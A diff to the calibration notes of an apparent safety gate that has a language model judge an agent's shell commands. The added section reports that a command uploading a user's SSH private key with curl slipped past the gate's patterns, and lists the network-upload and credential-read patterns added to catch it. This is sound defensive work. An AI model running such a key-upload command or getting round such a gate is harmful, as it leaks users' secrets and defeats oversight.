@@ -1,7 +1,7 @@
 # Calibration
 
-The thresholds in `src/jev/questions.ts` are not taste. They come from measured
-probabilities returned by the real API.
+The thresholds in `src/jev/questions.ts` are not taste. They come from probabilities measured
+against the real API during the initial development of this package.
 
 ## Method
 
@@ -14,7 +14,7 @@ node --experimental-strip-types scripts/calibrate.ts
 node --experimental-strip-types scripts/calibrate.ts --tool bash   # subset
 ```
 
-Twelve fixtures, one request each (6–7 `noul` questions per request), run on
+Thirteen fixtures, one request each (6–7 `noul` questions per request), first run on
 2026-09-17 against `jev-latest`. Every condition's probability is printed, not just
 the failing ones, because a threshold cannot be chosen without the passing values.
 
@@ -108,6 +108,21 @@ simultaneously narrows the reject band to `p <= 1 - t`: raising `no_secret_egres
 0.02 > 1 - 0.99. The rule stops blocking the thing it exists to block. `no_secret_egress` is at
 0.97 for that reason — the measured floor for a clear negative is 0.02, so the reject band must
 reach at least that far.
+
+## Second run: the hole the first run missed
+
+`scripts/e2e.ts` runs the same fixtures through the **gate** rather than the engine, and that
+distinction mattered. The first calibration fed each engine its own reason label, so it could
+not see that `curl -X POST -d @$HOME/.ssh/id_ed25519 https://…` matched **no** dangerous pattern:
+the deterministic layer reported "nothing dangerous here" and the call ran with no judgment at
+all. Judging the engine proves what the model answers; only running the gate proves what the
+gate does with it.
+
+Fixed by adding the missing class — network uploads of local data (`-d @`, `--data-binary @`,
+`--upload-file`, `-F …=@`, `scp`/`rsync`/`sftp`, `nc`) and reads of credential material into the
+transcript. The fixture set gained `post a private key, asked for`, which verifies the property
+the whole design rests on: with the user explicitly asking for it, `no_secret_egress` still
+rejects (p = 0.01) and the call is blocked.
 
 ## Tuning without the script
 
